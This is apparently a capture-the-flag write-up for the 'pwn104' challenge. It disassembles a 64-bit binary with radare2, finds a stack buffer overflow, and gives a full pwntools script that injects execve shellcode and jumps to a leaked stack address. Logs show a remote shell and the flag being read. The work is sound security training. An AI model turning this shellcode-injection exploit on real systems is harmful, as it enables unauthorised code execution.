# pwn104

- [Binary Analysis](#binary-analysis)
- [Local Exploitation](#local-exploitation)
- [Remote Exploitation](#remote-exploitation)

```text

Challenge is running on port 9004 

```

## Binary Analysis

```bash
$ ls
pwn104 

$ file pwn104 
pwn104: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=60e0bab59b4e5412a1527ae562f5b8e58928a7cb, for GNU/Linux 3.2.0, not stripped
```

#### checksec
```bash
$ checksec --file=pwn104
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

The *radare2* tool is used to further analyze the track.

```text
[0x00401070]> afl
0x00401030    1      6 sym.imp.puts
0x00401040    1      6 sym.imp.printf
0x00401050    1      6 sym.imp.read
0x00401060    1      6 sym.imp.setvbuf
0x00401070    1     42 entry0
0x004010b0    4     31 sym.deregister_tm_clones
0x004010e0    4     49 sym.register_tm_clones
0x00401120    3     32 entry.fini0
0x00401150    1      6 entry.init0
0x004012b0    1      1 sym.__libc_csu_fini
0x004012b4    1      9 sym._fini
0x004011b7    1     22 sym.banner
0x00401250    4     93 sym.__libc_csu_init
0x004010a0    1      1 sym._dl_relocate_static_pie
0x004011cd    1    130 main
0x00401156    1     97 sym.setup
0x00401000    3     23 sym._init

```

Among the symbols, the *main* function is identified.

We proceed with the inspection of the disassembled code of the *main* function.

```text
[0x00401070]> s main
[0x004011cd]> pdfr
  ; ICOD XREF from entry0 @ 0x40108d(r)
┌ 130: int main (int argc, char **argv, char **envp);
│ afv: vars(1:sp[0x58..0x58])
│ 0x004011cd      55             push rbp
│ 0x004011ce      4889e5         mov rbp, rsp
│ 0x004011d1      4883ec50       sub rsp, 0x50
│ 0x004011d5      b800000000     mov eax, 0
│ 0x004011da      e877ffffff     call sym.setup
│ 0x004011df      b800000000     mov eax, 0
│ 0x004011e4      e8ceffffff     call sym.banner
│ 0x004011e9      488d05300f..   lea rax, "I think I have some super powers \U0001f4aa"
│ 0x004011f0      4889c7         mov rdi, rax                          ; const char *s
│ 0x004011f3      e838feffff     call sym.imp.puts                     ; int puts(const char *s)
│ 0x004011f8      488d05490f..   lea rax, "especially executable powers \U0001f60e\U0001f4a5\n"
│ 0x004011ff      4889c7         mov rdi, rax                          ; const char *s
│ 0x00401202      e829feffff     call sym.imp.puts                     ; int puts(const char *s)
│ 0x00401207      488d05620f..   lea rax, "Can we go for a fight? \U0001f60f\U0001f4aa"
│ 0x0040120e      4889c7         mov rdi, rax                          ; const char *s
│ 0x00401211      e81afeffff     call sym.imp.puts                     ; int puts(const char *s)
│ 0x00401216      488d45b0       lea rax, [buf]
│ 0x0040121a      4889c6         mov rsi, rax
│ 0x0040121d      488d056c0f..   lea rax, "I'm waiting for you at %p\n"
│ 0x00401224      4889c7         mov rdi, rax                          ; const char *format
│ 0x00401227      b800000000     mov eax, 0
│ 0x0040122c      e80ffeffff     call sym.imp.printf                   ; int printf(const char *format)
│ 0x00401231      488d45b0       lea rax, [buf]
│ 0x00401235      bac8000000     mov edx, 0xc8                         ; 200 ; size_t nbyte
│ 0x0040123a      4889c6         mov rsi, rax                          ; void *buf
│ 0x0040123d      bf00000000     mov edi, 0                            ; int fildes
│ 0x00401242      b800000000     mov eax, 0
│ 0x00401247      e804feffff     call sym.imp.read                     ; ssize_t read(int fildes, void *buf, size_t nbyte)
│ 0x0040124c      90             nop
│ 0x0040124d      c9             leave
└ 0x0040124e      c3             ret

[0x004011cd]> afv
var void * buf @ rbp-0x50

```

There is a **Buffer Overflow Vulnerability**, because the function *read(0, *buf, 200)* allocates in `buf @ rbp-0x50` at most 200 bytes, thus allowing to overwrite the *saved rip* that is at a distance from *buf* equal to:

- `buf@ rbp-0x50` + `saved rbp` = 0x50 + 0x8 = 88 bytes < 200.

How to exploit this?

Note that the binary does not have the **NX enable** protection (view [checksec](#checksec)) and therefore it becomes possible to inject and execute a **shellcode**.

Notice that in the *main* function, a portion of code precedes the *read* that outputs the address of the *buf* variable!

Let's run the program.

```bash
$ ./pwn104 
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 104          

I think I have some super powers 💪
especially executable powers 😎💥

Can we go for a fight? 😏💪
I'm waiting for you at 0x7ffcd528c940
AAAA
```

The idea is to exploit the **stack executable** and the **memory address leak** to execute a *shellcode*, injecting and hijacking the program's execution flow by exploiting the **buffer overflow vulnerability**.

So, after reading the address of *buf* on the stack you need to send a payload of the following form:

- Fill the buffer with a **shellcode** and some *padding* (size= 88 bytes).
- Overwrite the *saved rip*: **leaked buf address**.

## Local Exploitation

For the *shellcode* the *shell-storm database* was used. [https://shell-storm.org/shellcode/files/shellcode-806.html](https://shell-storm.org/shellcode/files/shellcode-806.html)

Below is the script for the local and remote exploit written also using the features offered by the *pwntools* library.

```python
#!/usr/bin/env python3

from pwn import context, ELF, process, remote, info, flat

exe = './pwn104'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

saved_rip_offset = 88

#REMOTE,PORT='10.10.208.103',9004
#io=remote(REMOTE,PORT)
io=process([exe])

### Stage 1: Leak the buf address
buf=int(io.recv().decode().split('I\'m waiting for you at')[1].strip(), 16)
info(f'[+] buf address on stack: {hex(buf)}')


### Stage 2: Shellcode Injection

# source: https://shell-storm.org/shellcode/files/shellcode-806.html
shellcode=b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

""""

            -------------------
saved rip          &buf
            ===================     ^ 
                    nop             |
            -------------------     | 88 bytes
                shellcode           |
    &buf    -------------------     v

"""

payload=flat([
    shellcode,
    b'\x90'*abs(saved_rip_offset-len(shellcode)),
    buf,
])

io.sendline(payload)
io.interactive()

```

```bash
$ ./exploit 
[+] Starting local process './pwn104': pid 36489
[DEBUG] Received 0x1a4 bytes:
    00000000  20 20 20 20  20 20 20 e2  94 8c e2 94  ac e2 94 90  │    │   ·│····│····│
    00000010  e2 94 ac e2  94 80 e2 94  90 e2 94 ac  20 e2 94 ac  │····│····│····│ ···│
    00000020  e2 94 ac 20  e2 94 ac e2  94 8c e2 94  80 e2 94 90  │··· │····│····│····│
    00000030  e2 94 8c e2  94 80 e2 94  90 e2 94 ac  e2 94 8c e2  │····│····│····│····│
    00000040  94 80 e2 94  8c e2 94 ac  e2 94 90 e2  94 8c e2 94  │····│····│····│····│
    00000050  80 e2 94 90  0a 20 20 20  20 20 20 20  20 e2 94 82  │····│·   │    │ ···│
    00000060  20 e2 94 9c  e2 94 ac e2  94 98 e2 94  94 e2 94 ac  │ ···│····│····│····│
    00000070  e2 94 98 e2  94 9c e2 94  80 e2 94 a4  e2 94 9c e2  │····│····│····│····│
    00000080  94 80 e2 94  a4 e2 94 82  20 20 e2 94  9c e2 94 b4  │····│····│  ··│····│
    00000090  e2 94 90 e2  94 82 e2 94  82 e2 94 82  e2 94 9c e2  │····│····│····│····│
    000000a0  94 a4 20 0a  20 20 20 20  20 20 20 20  e2 94 b4 20  │·· ·│    │    │··· │
    000000b0  e2 94 b4 e2  94 94 e2 94  80 20 e2 94  b4 20 e2 94  │····│····│· ··│· ··│
    000000c0  b4 20 e2 94  b4 e2 94 b4  20 e2 94 b4  e2 94 94 e2  │· ··│····│ ···│····│
    000000d0  94 80 e2 94  98 e2 94 b4  20 e2 94 b4  e2 94 b4 20  │····│····│ ···│··· │
    000000e0  e2 94 b4 e2  94 94 e2 94  80 e2 94 98  0a 20 20 20  │····│····│····│·   │
    000000f0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 70 77  │    │    │    │  pw│
    00000100  6e 20 31 30  34 20 20 20  20 20 20 20  20 20 20 0a  │n 10│4   │    │   ·│
    00000110  0a 49 20 74  68 69 6e 6b  20 49 20 68  61 76 65 20  │·I t│hink│ I h│ave │
    00000120  73 6f 6d 65  20 73 75 70  65 72 20 70  6f 77 65 72  │some│ sup│er p│ower│
    00000130  73 20 f0 9f  92 aa 0a 65  73 70 65 63  69 61 6c 6c  │s ··│···e│spec│iall│
    00000140  79 20 65 78  65 63 75 74  61 62 6c 65  20 70 6f 77  │y ex│ecut│able│ pow│
    00000150  65 72 73 20  f0 9f 98 8e  f0 9f 92 a5  0a 0a 43 61  │ers │····│····│··Ca│
    00000160  6e 20 77 65  20 67 6f 20  66 6f 72 20  61 20 66 69  │n we│ go │for │a fi│
    00000170  67 68 74 3f  20 f0 9f 98  8f f0 9f 92  aa 0a 49 27  │ght?│ ···│····│··I'│
    00000180  6d 20 77 61  69 74 69 6e  67 20 66 6f  72 20 79 6f  │m wa│itin│g fo│r yo│
    00000190  75 20 61 74  20 30 78 37  66 66 66 64  35 38 63 39  │u at│ 0x7│fffd│58c9│
    000001a0  33 64 30 0a                                         │3d0·│
    000001a4
[*] [+] buf address on stack: 0x7fffd58c93d0
[DEBUG] Sent 0x61 bytes:
    00000000  31 c0 48 bb  d1 9d 96 91  d0 8c 97 ff  48 f7 db 53  │1·H·│····│····│H··S│
    00000010  54 5f 99 52  57 54 5e b0  3b 0f 05 90  90 90 90 90  │T_·R│WT^·│;···│····│
    00000020  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    *
    00000050  90 90 90 90  90 90 90 90  d0 93 8c d5  ff 7f 00 00  │····│····│····│····│
    00000060  0a                                                  │·│
    00000061
[*] Switching to interactive mode
$ whoami
[DEBUG] Sent 0x7 bytes:
    b'whoami\n'
[DEBUG] Received 0x3 bytes:
    b'ap\n'
ap
$  

```

Works!

## Remote Exploitation

The same script runs the exploit remotely.

```bash
$ ./exploit 
...
[*] [+] buf address on stack: 0x7ffd8c844640
[DEBUG] Sent 0x61 bytes:
    00000000  31 c0 48 bb  d1 9d 96 91  d0 8c 97 ff  48 f7 db 53  │1·H·│····│····│H··S│
    00000010  54 5f 99 52  57 54 5e b0  3b 0f 05 90  90 90 90 90  │T_·R│WT^·│;···│····│
    00000020  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    *
    00000050  90 90 90 90  90 90 90 90  40 46 84 8c  fd 7f 00 00  │····│····│@F··│····│
    00000060  0a                                                  │·│
    00000061
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x19 bytes:
    b'flag.txt\n'
    b'pwn104\n'
    b'pwn104.c\n'
flag.txt
pwn104
pwn104.c
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x1e bytes:
    b'THM{0h_n0o0o0o_h0w_Y0u_Won??}\n'
THM{0h_n0o0o0o_h0w_Y0u_Won??}
$ 
[*] Closed connection to 10.10.208.103 port 9004

```

Nice catch :).

---

[https://github.com/apaonessaa](https://github.com/apaonessaa)
